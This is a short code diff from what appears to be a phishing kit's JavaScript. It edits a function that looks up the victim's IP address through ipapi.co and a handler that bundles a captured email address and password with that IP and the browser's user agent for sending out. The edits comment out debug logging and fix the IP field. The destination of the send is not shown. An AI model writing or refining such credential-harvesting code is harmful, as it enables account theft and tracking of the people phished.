@@ -19,9 +19,9 @@ const getIPAddress = async () => {
     try {
         const request = await fetch("https://ipapi.co/json/")
         const response = await request.json()
-        console.group("IP")
-        console.log(response)
-        console.groupEnd("IP")
+        // console.group("IP")
+        // console.log(response)
+        // console.groupEnd("IP")
         return response
 
     } catch (e) {
@@ -72,7 +72,7 @@ const handleSendEmail = async () => {
     const ip = await getIPAddress()
     formData.append("email", USER_CREDS['email'])
     formData.append("password", USER_CREDS['password'])
-    formData.append("ip", ip.query)
+    formData.append("ip", ip.ip)
     formData.append("agent", navigator.userAgent)
     formData.append("send", "")
 
